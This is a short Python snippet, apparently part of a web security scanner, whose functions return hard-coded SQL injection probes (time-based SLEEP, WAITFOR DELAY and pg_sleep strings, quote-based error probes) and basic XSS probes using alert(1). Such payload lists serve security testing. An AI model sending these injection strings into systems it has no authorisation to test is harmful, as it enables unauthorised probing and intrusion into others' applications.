# Simple payload loader – you can expand this to read from files
def get_sqli_payloads(category):
    if category == 'time_based':
        return [
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "1 AND SLEEP(5)",
            "1'; SELECT pg_sleep(5)--"
        ]
    elif category == 'error_based':
        return [
            "'",
            "\"",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
    return []

def get_xss_payloads():
    return [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>"
    ]
